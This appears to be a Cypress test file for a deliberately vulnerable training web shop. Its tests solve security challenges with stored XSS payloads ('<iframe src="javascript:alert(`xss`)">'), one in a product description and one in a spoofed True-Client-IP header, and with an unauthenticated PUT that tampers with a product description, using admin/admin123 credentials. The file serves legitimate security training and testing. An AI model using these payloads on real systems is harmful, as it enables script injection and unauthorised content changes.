describe('/api', () => {
  describe('challenge "restfulXss"', () => {
    beforeEach(() => {
      cy.login({ email: 'admin', password: 'admin123' })
    })

    // Cypress alert bug
    // The challege also passes but its just that cypress freezes and is unable to perform any action
    xit('should be possible to create a new product when logged in', () => {
      cy.task('isDocker').then((isDocker) => {
        if (!isDocker) {
          cy.window().then(async () => {
            const response = await fetch(
              `${Cypress.config('baseUrl')}/api/Products`,
              {
                method: 'POST',
                cache: 'no-cache',
                headers: {
                  'Content-type': 'application/json',
                  Authorization: `Bearer ${localStorage.getItem('token')}`
                },
                body: JSON.stringify({
                  name: 'RestXSS',
                  description: '<iframe src="javascript:alert(`xss`)">',
                  price: 47.11
                })
              }
            )
            if (response.status === 200) {
              console.log('Success')
            }
          })

          cy.visit('/#/search?q=RestXSS')
          cy.reload()
          cy.get('img[alt="RestXSS"]').click()

          cy.on('window:alert', (t) => {
            expect(t).to.equal('xss')
          })

          cy.expectChallengeSolved({ challenge: 'API-only XSS' })
        }
      })
    })
  })

  describe('challenge "changeProduct"', () => {
    it('should be possible to change product via PUT request without being logged in', () => {
      cy.task('GetTamperingProductId').then((tamperingProductId: number) => {
        cy.task('GetOverwriteUrl').then((overwriteUrl: string) => {
          cy.window().then(async () => {
            const response = await fetch(
              `${Cypress.config('baseUrl')}/api/Products/${tamperingProductId}`,
              {
                method: 'PUT',
                cache: 'no-cache',
                headers: {
                  'Content-type': 'application/json'
                },
                body: JSON.stringify({
                  description: `<a href="${overwriteUrl}" target="_blank">More...</a>`
                })
              }
            )
            assert.equal(response.status, 200)
          })

          cy.visit('/#/search')
        })
      })
      cy.expectChallengeSolved({ challenge: 'Product Tampering' })
    })
  })
})

describe('/rest/saveLoginIp', () => {
  describe('challenge "httpHeaderXss"', () => {
    beforeEach(() => {
      cy.login({
        email: 'admin',
        password: 'admin123'
      })
    })

    it('should be possible to save log-in IP when logged in', () => {
      cy.task('isDocker').then((isDocker) => {
        if (!isDocker) {
          cy.window().then(async () => {
            const response = await fetch(
              `${Cypress.config('baseUrl')}/rest/saveLoginIp`,
              {
                method: 'GET',
                cache: 'no-cache',
                headers: {
                  Authorization: `Bearer ${localStorage.getItem('token')}`,
                  'True-Client-IP': '<iframe src="javascript:alert(`xss`)">'
                }
              }
            )
            if (response.status === 200) {
              console.log('Success')
            }
          })
          cy.expectChallengeSolved({ challenge: 'HTTP-Header XSS' }) // TODO Add missing check for alert presence
        }
      })
    })
  })

  it('should not be possible to save log-in IP when not logged in', () => {
    cy.request({ url: '/rest/saveLoginIp', failOnStatusCode: false }).then(
      (response) => {
        console.log(response.body)
        expect(response.body).to.equal('Unauthorized')
      }
    )
  })
})
